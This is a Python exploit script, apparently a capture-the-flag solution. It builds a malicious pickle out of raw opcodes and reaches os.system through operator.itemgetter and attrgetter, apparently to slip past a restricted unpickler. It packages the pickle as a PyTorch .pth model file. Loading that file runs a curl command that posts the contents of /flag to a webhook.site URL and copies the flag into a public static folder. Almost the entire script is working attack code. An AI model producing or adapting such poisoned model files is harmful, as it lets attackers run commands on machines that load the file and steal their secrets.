import pickle
import zipfile
import io
import torch

# CONFIGURATION
# Replace with your actual webhook URL!
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

def push_str(s):
    b = s.encode('utf-8')
    return b'X' + (len(b)).to_bytes(4, 'little') + b

STACK_GLOBAL = b'\x93'
REDUCE = b'R'
TUPLE1 = b'\x85'
TUPLE2 = b'\x86'

pkl = b'\x80\x02'

# 1. 准备 operator.attrgetter
pkl += push_str('operator')
pkl += push_str('attrgetter')
pkl += STACK_GLOBAL
pkl += b'q\x00' # memo 0: attrgetter_class

# 2. 准备 sys.modules
pkl += push_str('sys')
pkl += push_str('modules')
pkl += STACK_GLOBAL
pkl += b'q\x01' # memo 1: sys.modules

# 3. 获取 os 模块
# os = sys.modules['os'] (dict access)
# operator.itemgetter('os')(sys.modules)
# 
# GLOBAL 'operator' 'itemgetter'
pkl += push_str('operator')
pkl += push_str('itemgetter')
pkl += STACK_GLOBAL 
# Call itemgetter('os')
pkl += push_str('os')
pkl += TUPLE1
pkl += REDUCE # getter_func
# Call getter_func(sys.modules)
pkl += b'h\x01' # sys.modules
pkl += TUPLE1
pkl += REDUCE # os module
pkl += b'q\x02' # memo 2: os

# 4. 获取 system 函数
# system = os.system
# operator.attrgetter('system')(os)
#
# Call attrgetter('system')
pkl += b'h\x00' # attrgetter
pkl += push_str('system')
pkl += TUPLE1
pkl += REDUCE # getter_func
# Call getter_func(os)
pkl += b'h\x02' # os
pkl += TUPLE1
pkl += REDUCE # system function
pkl += b'q\x03' # memo 3: system

# 5. Call system(CMD)
pkl += push_str(CMD)
pkl += TUPLE1
pkl += REDUCE

pkl += b'.'

def create_torch_zip(pickle_bytes):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
        zf.writestr('archive/data.pkl', pickle_bytes)
        zf.writestr('archive/version', b'3\n')
    return buffer.getvalue()

if __name__ == "__main__":
    final_zip = create_torch_zip(pkl)
    with open("nailong_payload_v18.pth", "wb") as f:
        f.write(final_zip)
    print("[+] Generated nailong_payload_v18.pth (operator.attrgetter/itemgetter)")
